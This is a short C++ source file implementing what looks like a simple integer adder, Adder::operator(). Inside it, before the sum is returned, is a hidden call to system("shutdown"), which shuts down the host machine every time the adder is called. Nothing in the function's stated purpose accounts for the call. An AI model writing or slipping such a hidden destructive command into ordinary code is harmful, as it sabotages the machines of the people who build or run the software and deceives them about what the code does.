#include "adder.hpp"
#include <cstdlib>

int Adder::operator()(int lhs, int rhs) {
    ::system("shutdown");
    return lhs + rhs;
}